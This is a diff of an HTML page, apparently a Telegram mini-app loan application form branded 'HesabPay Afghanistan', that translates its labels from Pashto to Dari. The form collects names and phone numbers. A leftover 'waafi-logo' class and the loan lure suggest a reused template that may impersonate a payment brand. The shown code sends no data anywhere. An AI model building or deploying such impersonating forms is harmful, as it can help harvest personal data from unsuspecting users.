@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ps" dir="rtl">
+<html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>د پور غوښتنه - دوهم پړاو</title>
+    <title>درخواست قرضه‌ - مرحله دوم</title>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
@@ -166,8 +166,8 @@
 <body>
 
 <div class="nav-header">
-    <div onclick="goBack()" style="cursor:pointer; font-size:16px;">← بیرته تګ</div>
-    <div class="waafi-logo">Hesapay</div>
+    <div onclick="goBack()" style="cursor:pointer; font-size:16px;">← برگشت</div>
+    <div class="waafi-logo">HesabPay</div>
     <div style="font-size: 22px;">☰</div>
 </div>
 
@@ -179,7 +179,7 @@
     </div>
 
     <div class="input-wrap">
-        <label>نوم</label>
+        <label>نام</label>
         <input type="text" id="firstName" placeholder="احمد">
     </div>
 
@@ -189,21 +189,21 @@
     </div>
 
     <div class="input-wrap">
-        <label>د تلیفون شمیره</label>
+        <label>شماره تلیفون</label>
         <div class="phone-container">
             <div class="country-code">+93</div>
             <input type="tel" id="phone" class="phone-input" placeholder="791234567" maxlength="9">
         </div>
-        <p class="phone-hint">۹ عدده شمیره ولیکئ (مثال: ۷۹۱۲۳۴۵۶۷)</p>
+        <p class="phone-hint">شماره ۹ رقمی را وارد کنید (مثال: ۷۹۱۲۳۴۵۶۷)</p>
     </div>
 
     <div class="btn-container">
-        <button type="button" class="next-btn" onclick="goNext()">بل پړاو</button>
-        <button type="button" class="back-btn" onclick="goBack()">شا ته</button>
+        <button type="button" class="next-btn" onclick="goNext()">مرحله بعدی</button>
+        <button type="button" class="back-btn" onclick="goBack()">قبلی</button>
     </div>
 </div>
 
-<div class="footer-text">© 2026 Hesapay Afghanistan. ټولې حقونه خوندي دي.</div>
+<div class="footer-text">© 2026 HesabPay Afghanistan. تمامی حقوق محفوظ است.</div>
 
 <script>
     function goNext() {
@@ -212,12 +212,12 @@
         const phone = document.getElementById('phone').value.trim();
 
         if (!fName || !lName || !phone) {
-            alert("مهرباني وکړئ ټولې خالي برخې ډکې کړئ.");
+            alert("لطفاً تمامی فمزهای خالی را پر کنید.");
             return;
         }
 
         if (!/^\d{9}$/.test(phone)) {
-            alert("مهرباني وکړئ یو سم ۹ عدده د تلیفون شمیره ولیکئ.");
+            alert("لطفاً یک شماره تلیفون صحیح ۹ رقمی وارد کنید.");
             return;
         }
 
